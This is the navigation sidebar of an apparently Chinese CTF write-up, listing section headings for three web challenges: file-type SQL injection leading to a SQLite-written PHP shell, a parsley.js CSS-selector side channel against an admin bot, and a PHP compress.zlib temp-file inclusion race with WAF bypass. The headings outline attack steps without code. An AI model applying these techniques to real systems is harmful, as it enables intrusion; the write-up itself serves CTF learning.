<span class="nav-text">所以我们基本上可以不用考虑是否存在通过可控文件名上传文件getshell了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#纵观整个文件，其实我们可以发现，我们可控的输入点也只有在文件类型当中，文件类型又被拼入到了sql语句当中"><span class="nav-number">1.0.1.5.</span> <span class="nav-text">纵观整个文件，其实我们可以发现，我们可控的输入点也只有在文件类型当中，文件类型又被拼入到了sql语句当中</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#所以比较明显，我们只能通过这个来进行sql注入来进行一波操作了。"><span class="nav-number">1.0.1.6.</span> <span class="nav-text">所以比较明显，我们只能通过这个来进行sql注入来进行一波操作了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#参考的思路就是fuzz一些特殊的文件，可能存在某些文件使用finfo得出的结果含有单引号什么的，并且我们还能够插入可控数据，于是我们就开始fuzz文件头，从0x00到0xff0xff。"><span class="nav-number">1.0.1.7.</span> <span class="nav-text">参考的思路就是fuzz一些特殊的文件，可能存在某些文件使用finfo得出的结果含有单引号什么的，并且我们还能够插入可控数据，于是我们就开始fuzz文件头，从0x00到0xff0xff。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#终于在0x1f0x9d得到一个文件类型是compress-39-d-data，虽然有单引号，但是不存在我们可控的数据。"><span class="nav-number">1.0.1.8.</span> <span class="nav-text">终于在0x1f0x9d得到一个文件类型是compress&#39;d data，虽然有单引号，但是不存在我们可控的数据。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#还有一个是0xfb0x01得到一个文件类型是QDOS-object-39-39-，看起来很对的样子，有两个单引号，并且我们貌似可以在单引号之间插入数据，我们可以随便测试一下"><span class="nav-number">1.0.1.9.</span> <span class="nav-text">还有一个是0xfb0x01得到一个文件类型是QDOS object&#39;&#39;，看起来很对的样子，有两个单引号，并且我们貌似可以在单引号之间插入数据，我们可以随便测试一下</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#发现这里被吃掉了一个p，于是我们调整一下-payload-就可以用来注入了。"><span class="nav-number">1.0.1.10.</span> <span class="nav-text">发现这里被吃掉了一个p，于是我们调整一下 payload 就可以用来注入了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#sqlite是可以用-php文件名来作为存储格式文件的，而且当前目录可写，于是我们就可以通过sqlite-attach一个z-php的方法来写shell了。"><span class="nav-number">1.0.1.11.</span> <span class="nav-text">sqlite是可以用.php文件名来作为存储格式文件的，而且当前目录可写，于是我们就可以通过sqlite attach一个z.php的方法来写shell了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这里可能需要注意的就是有长度限制，所以我们需要分两次来写-shell"><span class="nav-number">1.0.1.12.</span> <span class="nav-text">这里可能需要注意的就是有长度限制，所以我们需要分两次来写 shell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#other-file"><span class="nav-number">1.0.1.13.</span> <span class="nav-text">other file</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#看其他选手的公开的-wp-也是很有趣的一件事，然后从-ctftime-上公开的-wp，我们可以发现还存在着这么一些文件可以用来注入。"><span class="nav-number">1.0.1.14.</span> <span class="nav-text">看其他选手的公开的 wp 也是很有趣的一件事，然后从 ctftime 上公开的 wp，我们可以发现还存在着这么一些文件可以用来注入。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#TeX-DVI-file"><span class="nav-number">1.0.1.15.</span> <span class="nav-text">TeX DVI file</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#0xf702文件头，在填充一定数据后有我们安全可控的数据"><span class="nav-number">1.0.1.16.</span> <span class="nav-text">0xf702文件头，在填充一定数据后有我们安全可控的数据</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#jpeg"><span class="nav-number">1.0.1.17.</span> <span class="nav-text">jpeg</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在-jpeg-的-EXIF-数据段中有用来标识-software-的数据也是我们可控的地方，同样用来标识-comment-的地方我们也可控。于是我们可以使用-exiftool-来修改图片。"><span class="nav-number">1.0.1.18.</span> <span class="nav-text">在 jpeg 的 EXIF 数据段中有用来标识 software 的数据也是我们可控的地方，同样用来标识 comment 的地方我们也可控。于是我们可以使用 exiftool 来修改图片。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#null"><span class="nav-number">1.0.1.19.</span> <span class="nav-text">#!</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们还可以利用-的文件来构造payload"><span class="nav-number">1.0.1.20.</span> <span class="nav-text">我们还可以利用#!/的文件来构造payload</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#gz"><span class="nav-number">1.0.1.21.</span> <span class="nav-text">gz</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#利用gunzip生成的gz文件，我们也可以用来注入，我们可控的数据是它的文件名"><span class="nav-number">1.0.1.22.</span> <span class="nav-text">利用gunzip生成的gz文件，我们也可以用来注入，我们可控的数据是它的文件名</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#当然我们也可以直接修改gz文件的内容"><span class="nav-number">1.0.1.23.</span> <span class="nav-text">当然我们也可以直接修改gz文件的内容</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x02-WriteUpBin"><span class="nav-number">1.0.2.</span> <span class="nav-text">0x02 WriteUpBin</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#一道比较有意思的侧信道题目，我们可以通过所给附件搭建形式知道，flag-存放在数据库当中，并且是在-admin-用户的第一条-writeup-数据的内容当中，题目提供简单的上传文本的功能，并且可以提交给-admin-，让-admin-给你点赞。"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">一道比较有意思的侧信道题目，我们可以通过所给附件搭建形式知道，flag 存放在数据库当中，并且是在 admin 用户的第一条 writeup 数据的内容当中，题目提供简单的上传文本的功能，并且可以提交给 admin ，让 admin 给你点赞。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#项目的结构如下："><span class="nav-number">1.0.2.2.</span> <span class="nav-text">项目的结构如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#既然flag在数据库当中，那我们可以首先来看看show-php，因为这个文件可以直接用来获取writeup的内容。"><span class="nav-number">1.0.2.3.</span> <span class="nav-text">既然flag在数据库当中，那我们可以首先来看看show.php，因为这个文件可以直接用来获取writeup的内容。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以看到id并没有什么鉴权措施，也就是说，我们可以通过writeup-id来获取writeup内容，而flag-writeup-id在admin用户数据当中，而在header-php中可以看到当前用户所有的writeup-id"><span class="nav-number">1.0.2.4.</span> <span class="nav-text">我们可以看到id并没有什么鉴权措施，也就是说，我们可以通过writeup id来获取writeup内容，而flag writeup id在admin用户数据当中，而在header.php中可以看到当前用户所有的writeup id</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#既然有提交代码给admin的功能，那么是不是有可能是一个xss或者什么的？"><span class="nav-number">1.0.2.5.</span> <span class="nav-text">既然有提交代码给admin的功能，那么是不是有可能是一个xss或者什么的？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们还可以看到admin在收到writeup后的主要操作："><span class="nav-number">1.0.2.6.</span> <span class="nav-text">我们还可以看到admin在收到writeup后的主要操作：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以看到admin在进行登陆之后使用find-element-by-xpath找到了id为like的input标签，并进行了点击，也就是提交给admin的writeup后，admin会浏览进行点击，发送一个点赞请求"><span class="nav-number">1.0.2.7.</span> <span class="nav-text">我们可以看到admin在进行登陆之后使用find_element_by_xpath找到了id为like的input标签，并进行了点击，也就是提交给admin的writeup后，admin会浏览进行点击，发送一个点赞请求</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#接着我们来看看general-php中的防御措施"><span class="nav-number">1.0.2.8.</span> <span class="nav-text">接着我们来看看general.php中的防御措施</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#而script-src设置的nonce只能在header-php使用了，而且我们也拿不到这个nonce"><span class="nav-number">1.0.2.9.</span> <span class="nav-text">而script-src设置的nonce只能在header.php使用了，而且我们也拿不到这个nonce</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#所以我们可能需要往点击事件那一方面思考，并且利用题目引入的两个-js-文件入手，一个-jquery-js-，另一个-parsley-js。"><span class="nav-number">1.0.2.10.</span> <span class="nav-text">所以我们可能需要往点击事件那一方面思考，并且利用题目引入的两个 js 文件入手，一个 jquery.js ，另一个 parsley.js。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Parsley-js"><span class="nav-number">1.0.2.11.</span> <span class="nav-text">Parsley.js</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以去parsley-js-doc看到该lib的简单说明以及使用："><span class="nav-number">1.0.2.12.</span> <span class="nav-text">我们可以去parsley.js doc看到该lib的简单说明以及使用：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#可以看出这是个简单的前端验证库，简单查一下文档，我们可以发现有几个有意思的-API："><span class="nav-number">1.0.2.13.</span> <span class="nav-text">可以看出这是个简单的前端验证库，简单查一下文档，我们可以发现有几个有意思的 API：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#根据文档，我们可以利用data-parsley-trigger设置我们的触发方式，使用data-parsley-error-message来自定义我们的错误信息，使用data-parsley-errors-container来自定义我们的显示错误的位置。"><span class="nav-number">1.0.2.14.</span> <span class="nav-text">根据文档，我们可以利用data-parsley-trigger设置我们的触发方式，使用data-parsley-error-message来自定义我们的错误信息，使用data-parsley-errors-container来自定义我们的显示错误的位置。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#根据文档，我们可以简单用一个data-parsley-validate指定我们需要验证的表单，然后利用错误信息把元素标签输出出来，并且我们接着还可以利用指定输出位置来控制输出，例如："><span class="nav-number">1.0.2.15.</span> <span class="nav-text">根据文档，我们可以简单用一个data-parsley-validate指定我们需要验证的表单，然后利用错误信息把元素标签输出出来，并且我们接着还可以利用指定输出位置来控制输出，例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#data-parsley-trigger指定了blur事件，也就是当我们的-input-失焦时，会显示我们的错误信息，并且在-id-为-div1-的元素中显示，更重要的是，浏览器也将其进行了渲染。"><span class="nav-number">1.0.2.16.</span> <span class="nav-text">data-parsley-trigger指定了blur事件，也就是当我们的 input 失焦时，会显示我们的错误信息，并且在 id 为 div1 的元素中显示，更重要的是，浏览器也将其进行了渲染。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Click"><span class="nav-number">1.0.2.17.</span> <span class="nav-text">Click</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#回到题目当中，admin-所做的动作有两个，一个就是登录，根据题目信息，我们基本上对这个操作没办法进行什么干扰，另外一个就是点赞了，更具体来说就是通过-show-php-打开你的-writeup-内容，并且点击页面上-id-为-like-的-input-标签，所以我们更可能的事对点赞操作进行一个干扰或者其他的操作，并且根据实际测试，通过selenium-webdriver调用find-element-by-xpath函数得到的-id-为-like-的-input-元素只能有第一个，也就是说，即使我们在-writeup-内容中插入一个-id-为-like-的-input-标签，admin-也只会根据页面顺序拿到第一个点赞-input-。"><span class="nav-number">1.0.2.18.</span> <span class="nav-text">回到题目当中，admin 所做的动作有两个，一个就是登录，根据题目信息，我们基本上对这个操作没办法进行什么干扰，另外一个就是点赞了，更具体来说就是通过 show.php 打开你的 writeup 内容，并且点击页面上 id 为 like 的 input 标签，所以我们更可能的事对点赞操作进行一个干扰或者其他的操作，并且根据实际测试，通过selenium.webdriver调用find_element_by_xpath函数得到的 id 为 like 的 input 元素只能有第一个，也就是说，即使我们在 writeup 内容中插入一个 id 为 like 的 input 标签，admin 也只会根据页面顺序拿到第一个点赞 input 。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#并且-CSP-也限制得很严格，似乎陷入了僵局，但是如果我们有以上-parsley-js-的知识，我们似乎可以通过错误信息来构造一些-Payload-。"><span class="nav-number">1.0.2.19.</span> <span class="nav-text">并且 CSP 也限制得很严格，似乎陷入了僵局，但是如果我们有以上 parsley.js 的知识，我们似乎可以通过错误信息来构造一些 Payload 。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#首先，因为find-element-by-xpath只会得到第一个-id-为-like-的-input-标签，而我们通过-parsley-js-可以将错误信息输出到指定页面位置，所以我们大概可以有一个想法，把一个没有用的单独的-id-为-like-的-input-标签插入到原来的点赞按钮之前。"><span class="nav-number">1.0.2.20.</span> <span class="nav-text">首先，因为find_element_by_xpath只会得到第一个 id 为 like 的 input 标签，而我们通过 parsley.js 可以将错误信息输出到指定页面位置，所以我们大概可以有一个想法，把一个没有用的单独的 id 为 like 的 input 标签插入到原来的点赞按钮之前。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是这有什么用呢？我们再来仔细看看-admin-要点赞的那个页面"><span class="nav-number">1.0.2.21.</span> <span class="nav-text">但是这有什么用呢？我们再来仔细看看 admin 要点赞的那个页面</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#页面上部分是-header-php-，会展示当前用户所提交的-writeup-，也就是说-admin-的这个页面，第一个也是唯一一个-a-标签就是-flag-的地址，现在的问题就变成了我们怎么获取这个地址的问题了，更详细的来说，我们如何获取这个-a-标签中的-href-属性值，或者更确切的说就是获取-writeup-id-的事情了。"><span class="nav-number">1.0.2.22.</span> <span class="nav-text">页面上部分是 header.php ，会展示当前用户所提交的 writeup ，也就是说 admin 的这个页面，第一个也是唯一一个 a 标签就是 flag 的地址，现在的问题就变成了我们怎么获取这个地址的问题了，更详细的来说，我们如何获取这个 a 标签中的 href 属性值，或者更确切的说就是获取 writeup id 的事情了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#CSS-Selector"><span class="nav-number">1.0.2.23.</span> <span class="nav-text">CSS Selector</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如何获取-a-标签中的-href-属性值貌似也就跟我们之前提到的data-parsley-errors-container-API有关了，而这个-API-又支持-CSS-选择器，那我们是不是可以通过-CSS-选择器来让我们的报错信息放到这个-a-标签之后呢，这样以来也就直接就放到了点赞按钮之前了。"><span class="nav-number">1.0.2.24.</span> <span class="nav-text">如何获取 a 标签中的 href 属性值貌似也就跟我们之前提到的data-parsley-errors-container API有关了，而这个 API 又支持 CSS 选择器，那我们是不是可以通过 CSS 选择器来让我们的报错信息放到这个 a 标签之后呢，这样以来也就直接就放到了点赞按钮之前了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#类似之前-XCTF-Final-一个-CSS-侧信道的题目，我们可以通过利用a-href-39-show-php-id-flag-的形式来进行元素选择。"><span class="nav-number">1.0.2.25.</span> <span class="nav-text">类似之前 XCTF Final 一个 CSS 侧信道的题目，我们可以通过利用a[href^=&#39;/show.php?id={flag}]的形式来进行元素选择。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#也就是说，当我们传入的-flag-值与页面中的-href-属性值也就是-writeup-id-前部分完全匹配的时候，我们可以把一个无效的-id-like-input-标签插入到该-a-标签之后，亦即真正用于提交-like-请求的-input-标签之前；如果我们传入的-flag-值与页面中的-href-属性值也就是-writeup-id-前部分不完全匹配的，parsley-js-什么也不会做，admin-会正常地点赞，我们可以正常地在自己的-writeup-页面看到-admin-的点赞。"><span class="nav-number">1.0.2.26.</span> <span class="nav-text">也就是说，当我们传入的 flag 值与页面中的 href 属性值也就是 writeup id 前部分完全匹配的时候，我们可以把一个无效的 id=like input 标签插入到该 a 标签之后，亦即真正用于提交 like 请求的 input 标签之前；如果我们传入的 flag 值与页面中的 href 属性值也就是 writeup id 前部分不完全匹配的，parsley.js 什么也不会做，admin 会正常地点赞，我们可以正常地在自己的 writeup 页面看到 admin 的点赞。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#所以基于这个差异，我们可以利用这种形式来进行一个侧信道攻击获取-flag-的-writeup-id。"><span class="nav-number">1.0.2.27.</span> <span class="nav-text">所以基于这个差异，我们可以利用这种形式来进行一个侧信道攻击获取 flag 的 writeup id。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#脚本编写也比较简单："><span class="nav-number">1.0.2.28.</span> <span class="nav-text">脚本编写也比较简单：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#拿到-writeup-id-之后直接访问即可："><span class="nav-number">1.0.2.29.</span> <span class="nav-text">拿到 writeup id 之后直接访问即可：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Other-Selector"><span class="nav-number">1.0.2.30.</span> <span class="nav-text">Other Selector</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#当然该页面不仅可以使用-a-标签的-href-属性进行获取-writeup-id，也可以获取它-value-值，例如："><span class="nav-number">1.0.2.31.</span> <span class="nav-text">当然该页面不仅可以使用 a 标签的 href 属性进行获取 writeup id，也可以获取它 value 值，例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#或者使用data-parsley-equalto-API-进行判断属性值："><span class="nav-number">1.0.2.32.</span> <span class="nav-text">或者使用data-parsley-equalto API 进行判断属性值：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x03-Includer"><span class="nav-number">1.0.3.</span> <span class="nav-text">0x03 Includer</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#题目给出源代码以及部署文件，源代码如下："><span class="nav-number">1.0.3.1.</span> <span class="nav-text">题目给出源代码以及部署文件，源代码如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Configuration-Error"><span class="nav-number">1.0.3.2.</span> <span class="nav-text">Configuration Error</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#其中配置文件有一个比较明显的配置错误："><span class="nav-number">1.0.3.3.</span> <span class="nav-text">其中配置文件有一个比较明显的配置错误：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#开启了列目录并且我们可以遍历到上层文件夹。"><span class="nav-number">1.0.3.4.</span> <span class="nav-text">开启了列目录并且我们可以遍历到上层文件夹。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Update-Arbitrary-Data"><span class="nav-number">1.0.3.5.</span> <span class="nav-text">Update Arbitrary Data</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#一开始看到过滤了-lt-，就想到了p牛博客里面有关死亡exit的内容，谈一谈php-filter的妙用，但是p牛的原文用的是file-put-content，但是这里用的是file-get-contents，并且这里的判断也在使用了file-get-contents函数之后进行判断是否有-lt-，所以这里的编码绕过就不太可能了。"><span class="nav-number">1.0.3.6.</span> <span class="nav-text">一开始看到过滤了&lt;?，就想到了p牛博客里面有关死亡exit的内容，谈一谈php://filter的妙用，但是p牛的原文用的是file_put_content，但是这里用的是file_get_contents，并且这里的判断也在使用了file_get_contents函数之后进行判断是否有&lt;?，所以这里的编码绕过就不太可能了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#而且这里最奇怪的就是之前用了一些看似无关紧要的代码，比如使用了putenv-函数等，给了我们一个sandbox，然而我们似乎无法利用表面的代码进行文件上传等操作。"><span class="nav-number">1.0.3.7.</span> <span class="nav-text">而且这里最奇怪的就是之前用了一些看似无关紧要的代码，比如使用了putenv()函数等，给了我们一个sandbox，然而我们似乎无法利用表面的代码进行文件上传等操作。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#balsn队伍在公开的wp中写了比较详细的源码分析，这里我就配合其中的wp进行一下简单的分析。"><span class="nav-number">1.0.3.8.</span> <span class="nav-text">balsn队伍在公开的wp中写了比较详细的源码分析，这里我就配合其中的wp进行一下简单的分析。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#首先直接给出结论，我们可以使用compress-zlib-流进行上传任意文件，接着我们来看看相关原理。"><span class="nav-number">1.0.3.9.</span> <span class="nav-text">首先直接给出结论，我们可以使用compress.zlib://流进行上传任意文件，接着我们来看看相关原理。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在php-src源码中，我们可以找到该流的相关触发解析函数php-stream-gzopen"><span class="nav-number">1.0.3.10.</span> <span class="nav-text">在php-src源码中，我们可以找到该流的相关触发解析函数php_stream_gzopen</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ext-zlib-zlib-fopen-wrapper-c"><span class="nav-number">1.0.3.11.</span> <span class="nav-text">ext/zlib/zlib_fopen_wrapper.c</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以看到有个标志位STREAM-WILL-CAST，我们可以先看看这个标志位用来干嘛，在main-php-streams-h定义了该标志位"><span class="nav-number">1.0.3.12.</span> <span class="nav-text">我们可以看到有个标志位STREAM_WILL_CAST，我们可以先看看这个标志位用来干嘛，在main/php_streams.h定义了该标志位:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#很明显，这是一个用来将stream转换成FILE-的标志位，在这里就与我们创建临时文件有关了。"><span class="nav-number">1.0.3.13.</span> <span class="nav-text">很明显，这是一个用来将stream转换成FILE*的标志位，在这里就与我们创建临时文件有关了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#接着我们跟进php-stream-open-wrapper-ex函数，该函数在main-php-streams-h中被define为-php-stream-open-wrapper-ex。"><span class="nav-number">1.0.3.14.</span> <span class="nav-text">接着我们跟进php_stream_open_wrapper_ex函数，该函数在main/php_streams.h中被define为_php_stream_open_wrapper_ex。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#该函数调用了php-stream-make-seekable-rel，并向其中传入了STREAM-WILL-CAST参数，我们跟进php-stream-make-seekable-rel函数，它在main-php-streams-h中被define为-php-stream-make-seekable，继续跟进"><span class="nav-number">1.0.3.15.</span> <span class="nav-text">该函数调用了php_stream_make_seekable_rel，并向其中传入了STREAM_WILL_CAST参数，我们跟进php_stream_make_seekable_rel函数，它在main/php_streams.h中被define为_php_stream_make_seekable，继续跟进</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#main-streams-cast-c"><span class="nav-number">1.0.3.16.</span> <span class="nav-text">main/streams/cast.c</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以看到如果flags与PHP-STREAM-PREFER-STDIO都被设置的话，而PHP-STREAM-PREFER-STDIO在main-php-streams-h中已经被define。"><span class="nav-number">1.0.3.17.</span> <span class="nav-text">我们可以看到如果flags与PHP_STREAM_PREFER_STDIO都被设置的话，而PHP_STREAM_PREFER_STDIO在main/php_streams.h中已经被define。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们只需要关心flags的值就好了，我们只需要确定flags的值非零即可，根据前面的跟进我们易知flags的在这里非零，所以这里就调用了php-stream-fopen-tmpfile函数创建了临时文件。"><span class="nav-number">1.0.3.18.</span> <span class="nav-text">我们只需要关心flags的值就好了，我们只需要确定flags的值非零即可，根据前面的跟进我们易知flags的在这里非零，所以这里就调用了php_stream_fopen_tmpfile函数创建了临时文件。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#于是我们可以做一个简单的验证，在本机上跑源代码，并用pwntools起一个服务用来发送一个大文件"><span class="nav-number">1.0.3.19.</span> <span class="nav-text">于是我们可以做一个简单的验证，在本机上跑源代码，并用pwntools起一个服务用来发送一个大文件</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这样我在本机上用fswatch很明显可以看到临时文件已经生成，并且文件内容就是我们发送的内容。"><span class="nav-number">1.0.3.20.</span> <span class="nav-text">这样我在本机上用fswatch很明显可以看到临时文件已经生成，并且文件内容就是我们发送的内容。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Keep-Temp-File"><span class="nav-number">1.0.3.21.</span> <span class="nav-text">Keep Temp File</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#临时文件终究还是会被php删除掉的，如果我们要进行包含的话，就需要利用一些方法让临时文件尽可能久的留在服务器上，这样我们才有机会去包含它。"><span class="nav-number">1.0.3.22.</span> <span class="nav-text">临时文件终究还是会被php删除掉的，如果我们要进行包含的话，就需要利用一些方法让临时文件尽可能久的留在服务器上，这样我们才有机会去包含它。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#所以这里是我们需要竞争的第一个点，基本上我们有两种方法让它停留比较久的时间："><span class="nav-number">1.0.3.23.</span> <span class="nav-text">所以这里是我们需要竞争的第一个点，基本上我们有两种方法让它停留比较久的时间：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Bypass-Waf"><span class="nav-number">1.0.3.24.</span> <span class="nav-text">Bypass Waf</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#接下来我们就要看如何来对关键地方进行绕过了。"><span class="nav-number">1.0.3.25.</span> <span class="nav-text">接下来我们就要看如何来对关键地方进行绕过了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这个地方问了很多师傅，并且参考了主要的公开WP，基本都是利用两个函数之间极端的时间窗进行绕过。"><span class="nav-number">1.0.3.26.</span> <span class="nav-text">这个地方问了很多师傅，并且参考了主要的公开WP，基本都是利用两个函数之间极端的时间窗进行绕过。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#什么意思呢？也就是说，在极其理想的情况下，我们通过自己的服务先发送一段垃圾数据，这时候通过stripos的判断就是没有PHP代码的文件数据，接着我们利用HTTP长链接的形式，只要这个链接不断开，在我们绕过第一个判断之后，我们就可以发送第二段含有PHP代码的数据了，这样就能使include-once包含我们的代码了。"><span class="nav-number">1.0.3.27.</span> <span class="nav-text">什么意思呢？也就是说，在极其理想的情况下，我们通过自己的服务先发送一段垃圾数据，这时候通过stripos的判断就是没有PHP代码的文件数据，接着我们利用HTTP长链接的形式，只要这个链接不断开，在我们绕过第一个判断之后，我们就可以发送第二段含有PHP代码的数据了，这样就能使include_once包含我们的代码了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因为我们无法知道什么时候能绕过第一个判断，所以这里的方法只能利用竞争的形式去包含临时文件，这里是第二个我们需要竞争的点。"><span class="nav-number">1.0.3.28.</span> <span class="nav-text">因为我们无法知道什么时候能绕过第一个判断，所以这里的方法只能利用竞争的形式去包含临时文件，这里是第二个我们需要竞争的点。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Leak-Dir-path"><span class="nav-number">1.0.3.29.</span> <span class="nav-text">Leak Dir path</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最后，要做到文件包含，自然得先知道它的文件路径，而文件路径每次都是随机的，所以我们又不得不通过某些方式去获取路径。"><span class="nav-number">1.0.3.30.</span> <span class="nav-text">最后，要做到文件包含，自然得先知道它的文件路径，而文件路径每次都是随机的，所以我们又不得不通过某些方式去获取路径。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#虽然我们可以直接看到题目是直接给出了路径，但是乍一看代码我们貌似只能等到全部函数结束之后才能拿到路径，然而之前我们说到的需要保留的长链接不能让我们立即得到我们的sandbox路径。"><span class="nav-number">1.0.3.31.</span> <span class="nav-text">虽然我们可以直接看到题目是直接给出了路径，但是乍一看代码我们貌似只能等到全部函数结束之后才能拿到路径，然而之前我们说到的需要保留的长链接不能让我们立即得到我们的sandbox路径。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#所以我们需要通过传入过大的name参数，导致PHP-output-buffer溢出，在保持连接的情况下获取沙箱路径，参考代码："><span class="nav-number">1.0.3.32.</span> <span class="nav-text">所以我们需要通过传入过大的name参数，导致PHP output buffer溢出，在保持连接的情况下获取沙箱路径，参考代码：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#GET-Flag"><span class="nav-number">1.0.3.33.</span> <span class="nav-text">GET Flag</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#所以整个流程我们可以总结为以下："><span class="nav-number">1.0.3.34.</span> <span class="nav-text">所以整个流程我们可以总结为以下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-利用compress-zlib-http-或者compress-zlib-ftp-来上传任意文件，并保持-HTTP-长链接竞争保存我们的临时文件"><span class="nav-number">1.0.3.35.</span> <span class="nav-text">1.利用compress.zlib://http://或者compress.zlib://ftp://来上传任意文件，并保持 HTTP 长链接竞争保存我们的临时文件</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-利用超长的-name-溢出-output-buffer-得到-sandbox-路径"><span class="nav-number">1.0.3.36.</span> <span class="nav-text">2.利用超长的 name 溢出 output buffer 得到 sandbox 路径</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-利用-Nginx-配置错误，通过-well-known-files-sandbox-来获取我们-tmp-文件的文件名"><span class="nav-number">1.0.3.37.</span> <span class="nav-text">3.利用 Nginx 配置错误，通过.well-known../files/sandbox/来获取我们 tmp 文件的文件名</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-发送另一个请求包含我们的-tmp-文件，此时并没有-PHP-代码"><span class="nav-number">1.0.3.38.</span> <span class="nav-text">4.发送另一个请求包含我们的 tmp 文件，此时并没有 PHP 代码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#5-绕过-WAF-判断后，发送-PHP-代码段，包含我们的-PHP-代码拿到-Flag"><span class="nav-number">1.0.3.39.</span> <span class="nav-text">5.绕过 WAF 判断后，发送 PHP 代码段，包含我们的 PHP 代码拿到 Flag</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#整个题目的关键点主要是以下几点-来自-wupco-："><span class="nav-number">1.0.3.40.</span> <span class="nav-text">整个题目的关键点主要是以下几点(来自 @wupco)：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#要利用大文件或ftp速度限制让连接保持"><span class="nav-number">1.0.3.41.</span> <span 